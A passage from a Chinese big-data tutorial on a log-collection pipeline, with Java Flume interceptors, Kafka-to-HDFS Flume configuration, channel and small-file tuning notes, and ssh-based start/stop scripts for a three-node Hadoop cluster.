punctuation">&lt;</span>descriptorRef</span><span class="token punctuation">></span></span>jar-with-dependencies<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRef</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>descriptorRefs</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>executions</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>execution</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>make-assembly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>phase</span><span class="token punctuation">></span></span>package<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>phase</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goals</span><span class="token punctuation">></span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>goal</span><span class="token punctuation">></span></span>single<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goal</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>goals</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>execution</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>executions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4）在com.molly.flume.interceptor包下创建JSONUtils类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JSONUtils</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isJSONValidate</span><span class="token punctuation">(</span>String log<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）在com.molly.flume.interceptor包下创建LogInterceptor类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Iterator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ETLInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String log <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>JSONUtils<span class="token punctuation">.</span><span class="token function">isJSONValidate</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> event<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Iterator<span class="token operator">&lt;</span>Event<span class="token operator">></span> iterator <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            Event next <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intercept</span><span class="token punctuation">(</span>next<span class="token punctuation">)</span><span class="token operator">==</span>null<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>                iterator<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> list<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ETLInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>       <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>6）打包</p><p>​      <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637725114820.png" alt="1637725114820"></p><p>7）需要先将打好的包放入到hadoop102的/opt/module/flume/lib文件夹下面。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> interceptorflume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>8）分发Flume到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync flume/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>9）hadoop102消费Flume数据</strong></p><p>为了查看第一次flume是否起作用，我们开启一个kafka消费端来消费kafkaChannel中的数据。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102~<span class="token punctuation">]</span>kafka-console-consumer.sh --topic topic_log --bootstrap-server hadoop102:9092<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>10）分别在hadoop102、hadoop103上启动Flume</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf <span class="token operator">&amp;</span><span class="token punctuation">[</span>molly@hadoop103 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf <span class="token operator">&amp;</span><span class="token punctuation">[</span>molly@hadoop102 flume<span class="token punctuation">]</span>$ bin/flume-ng agent --name a1 --conf-file conf/file-flume-kafka.conf  -n a1 -Dflume.root.logger<span class="token operator">=</span>INFO,console<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>11）观看9)中的kafka消费端有数据在消费。</p><h3 id="5-1-4-日志采集Flume启动停止脚本"><a href="#5-1-4-日志采集Flume启动停止脚本" class="headerlink" title="5.1.4 日志采集Flume启动停止脚本"></a>5.1.4 日志采集Flume启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本f1.sh</p><p>[molly@hadoop102 bin]$ vim f1.sh</p><p>​    在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;        for i in hadoop102 hadoop103        do                echo " --------启动 $i 采集flume-------"                ssh $i "nohup /opt/module/flume/bin/flume-ng agent --conf-file /opt/module/flume/conf/file-flume-kafka.conf --name a1 -Dflume.root.logger=INFO,LOGFILE >/opt/module/flume/log1.txt 2>&1  &"        done&#125;;;    "stop")&#123;        for i in hadoop102 hadoop103        do                echo " --------停止 $i 采集flume-------"                ssh $i "ps -ef | grep file-flume-kafka | grep -v grep |awk  '&#123;print \$2&#125;' | xargs -n1 kill -9 "        done&#125;;;esac<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明1：nohup，该命令可以在你退出帐户/关闭终端之后继续运行相应的进程。nohup就是不挂起的意思，不挂断地运行命令。</p><p>说明2：awk 默认分隔符为空格</p><p>说明3：xargs 表示取出前面命令运行的结果，作为后面命令的输入参数。</p><p>2）增加脚本执行权限</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>$ <span class="token function">chmod</span> u+x f1.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）f1集群启动脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f1.sh start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）f1集群停止脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ f1.sh stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>集群规划</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume（消费Kafka）</td><td></td><td></td><td>Flume</td></tr></tbody></table><h2 id="5-2-第二层flume采集"><a href="#5-2-第二层flume采集" class="headerlink" title="5.2 第二层flume采集"></a>5.2 第二层flume采集</h2><p>集群规划，第二层flume是消费Kafka数据的Flume，部署在hadoop104上。</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>Flume（消费Kafka）</td><td></td><td></td><td>Flume</td></tr></tbody></table><h3 id="5-2-1-项目经验之Flume组件选型"><a href="#5-2-1-项目经验之Flume组件选型" class="headerlink" title="5.2.1 项目经验之Flume组件选型"></a>5.2.1 项目经验之Flume组件选型</h3><p>第二次Flume主要作用是消费Kafka中的数据，然后存储到HDFS中，因此Source选择KafkaSource,sink选择HDFSsink。同时在source端使用一个拦截器：拦截器作用是获取日志中的实际时间。</p><p><img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637738855416.png" alt="1637738855416"></p><p>1）FileChannel和MemoryChannel区别</p><p>MemoryChannel传输数据速度更快，但因为数据保存在JVM的堆内存中，Agent进程挂掉会导致数据丢失，适用于对数据质量要求不高的需求。</p><p>FileChannel传输速度相对于Memory慢，但数据安全保障高，Agent进程挂掉也可以从失败中恢复数据。</p><p>选型：</p><p>金融类公司、对钱要求非常准确的公司通常会选择FileChannel</p><p>传输的是普通日志信息（京东内部一天丢100万-200万条，这是非常正常的），通常选择MemoryChannel。</p><p><strong>2）FileChannel优化</strong></p><p>通过配置dataDirs指向多个路径，每个路径对应不同的硬盘，增大Flume吞吐量。</p><p>官方说明如下：</p><p>checkpointDir和backupCheckpointDir也尽量配置在不同硬盘对应的目录中，保证checkpoint坏掉后，可以快速使用backupCheckpointDir恢复数据</p><p><strong>3）Sink：HDFS Sink</strong></p><p>（1）HDFS存入大量小文件，有什么影响？</p><p><strong>元数据层面：</strong>每个小文件都有一份元数据，其中包括文件路径，文件名，所有者，所属组，权限，创建时间等，这些信息都保存在Namenode内存中。所以小文件过多，会占用Namenode服务器大量内存，影响Namenode性能和使用寿命</p><p><strong>计算层面：</strong>默认情况下MR会对每个小文件启用一个Map任务计算，非常影响计算性能。同时也影响磁盘寻址时间。</p><p>（2）HDFS小文件处理</p><p>官方默认的这三个参数配置写入HDFS后会产生小文件，hdfs.rollInterval、hdfs.rollSize、hdfs.rollCount</p><p>基于以上hdfs.rollInterval=3600，hdfs.rollSize=134217728，hdfs.rollCount =0几个参数综合作用，效果如下：</p><p>（1）文件在达到128M时会滚动生成新文件</p><p>（2）文件创建超3600秒时会滚动生成新文件</p><h3 id="5-2-2-Flume拦截器"><a href="#5-2-2-Flume拦截器" class="headerlink" title="5.2.2 Flume拦截器"></a>5.2.2 Flume拦截器</h3><p>由于flume默认会用linux系统时间，作为输出到HDFS路径的时间。如果数据是23:59分产生的。Flume消费kafka里面的数据时，有可能已经是第二天了，那么这部门数据会被发往第二天的HDFS路径。我们希望的是根据日志里面的实际时间，发往HDFS的路径，<strong>所以下面拦截器作用是获取日志中的实际时间</strong>。</p><p>1）在com.molly.flume.interceptor包下创建TimeStampInterceptor类</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>molly<span class="token punctuation">.</span>interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSONObject<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>Event<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>flume<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>Interceptor<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>charset<span class="token punctuation">.</span>StandardCharsets<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Map<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TimeStampInterceptor</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> ArrayList<span class="token operator">&lt;</span>Event<span class="token operator">></span> events <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Event <span class="token function">intercept</span><span class="token punctuation">(</span>Event event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String log <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> StandardCharsets<span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">;</span>        JSONObject jsonObject <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>        String ts <span class="token operator">=</span> jsonObject<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"timestamp"</span><span class="token punctuation">,</span> ts<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> event<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Event<span class="token operator">></span> <span class="token function">intercept</span><span class="token punctuation">(</span>List<span class="token operator">&lt;</span>Event<span class="token operator">></span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        events<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Event event <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            events<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">intercept</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> events<span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Builder</span> <span class="token keyword">implements</span> <span class="token class-name">Interceptor<span class="token punctuation">.</span>Builder</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Interceptor <span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TimeStampInterceptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span>Context context<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）重新打包</p><p>​                 <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637739135017.png" alt="1637739135017">                   </p><p>3）需要先将打好的包放入到hadoop102的/opt/module/flume/lib文件夹下面。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 lib<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token operator">|</span> <span class="token function">grep</span> interceptorflume-interceptor-1.0-SNAPSHOT-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4）分发Flume到hadoop103、hadoop104</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ xsync flume/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-2-3-日志消费Flume配置"><a href="#5-2-3-日志消费Flume配置" class="headerlink" title="5.2.3 日志消费Flume配置"></a>5.2.3 日志消费Flume配置</h3><p>1）Flume的具体配置如下：</p><p>​    （1）在hadoop104的/opt/module/flume/conf目录下创建kafka-flume-hdfs.conf文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop104 conf<span class="token punctuation">]</span>$ vim kafka-flume-hdfs.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件配置如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">## 组件a1.sources=r1a1.channels=c1a1.sinks=k1## source1a1.sources.r1.type = org.apache.flume.source.kafka.KafkaSourcea1.sources.r1.batchSize = 5000a1.sources.r1.batchDurationMillis = 2000a1.sources.r1.kafka.bootstrap.servers = hadoop102:9092,hadoop103:9092,hadoop104:9092a1.sources.r1.kafka.topics=topic_loga1.sources.r1.interceptors = i1a1.sources.r1.interceptors.i1.type = com.molly.flume.interceptor.TimeStampInterceptor$Builder## channel1a1.channels.c1.type = filea1.channels.c1.checkpointDir = /opt/module/flume/checkpoint/behavior1a1.channels.c1.dataDirs = /opt/module/flume/data/behavior1/a1.channels.c1.maxFileSize = 2146435071a1.channels.c1.capacity = 1000000a1.channels.c1.keep-alive = 6## sink1a1.sinks.k1.type = hdfsa1.sinks.k1.hdfs.path = /origin_data/gmall/log/topic_log/%Y-%m-%da1.sinks.k1.hdfs.filePrefix = log-a1.sinks.k1.hdfs.round = falsea1.sinks.k1.hdfs.rollInterval = 10a1.sinks.k1.hdfs.rollSize = 134217728a1.sinks.k1.hdfs.rollCount = 0## 控制输出文件是原生文件。a1.sinks.k1.hdfs.fileType = CompressedStreama1.sinks.k1.hdfs.codeC = lzop## 拼装a1.sources.r1.channels = c1a1.sinks.k1.channel= c1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-2-4-日志消费Flume启动停止脚本"><a href="#5-2-4-日志消费Flume启动停止脚本" class="headerlink" title="5.2.4 日志消费Flume启动停止脚本"></a>5.2.4 日志消费Flume启动停止脚本</h3><p>1）在/home/molly/bin目录下创建脚本f2.sh</p><p>[molly@hadoop102 bin]$ vim f2.sh</p><p>​    在脚本中填写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashcase $1 in"start")&#123;        for i in hadoop104        do                echo " --------启动 $i 消费flume-------"                ssh $i "nohup /opt/module/flume/bin/flume-ng agent --conf-file /opt/module/flume/conf/kafka-flume-hdfs.conf --name a1 -Dflume.root.logger=INFO,LOGFILE >/opt/module/flume/log2.txt   